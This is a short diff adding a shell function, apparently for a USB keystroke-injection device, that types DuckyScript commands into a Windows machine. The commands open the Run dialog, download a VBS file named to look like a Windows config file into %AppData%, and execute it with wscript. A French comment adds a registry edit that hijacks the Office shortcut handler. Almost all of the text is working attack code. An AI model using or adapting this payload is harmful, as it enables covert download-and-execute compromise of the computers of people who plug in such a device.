@@ -1,0 +1,20 @@
+function onKeyboardUp()
+{
+        # we need no initial keyboard delay, before starting the DuckyScript
+        # if this method gets called, we know the HID keyboard stack is usable
+
+        cat <<- EOF | duckhid
+                GUI r
+                DELAY 500
+                STRING curl -o %AppData%/Microsoft/Windows/config.vbs http://localhost:8000/Target/config.vbs
+                ENTER
+                DELAY 3000
+                GUI r
+                DELAY 500
+                STRING wscript %AppData%/Microsoft/Windows/config.vbs
+                ENTER
+EOF
+        outhid
+}
+
+#On doit invoquer REG ADD HKCU\Software\Classes\ms-officeapp\Shell\Open\Command /t REG_SZ /d rundll32 pour désactiver l'ouverture d'office avec le raccourci
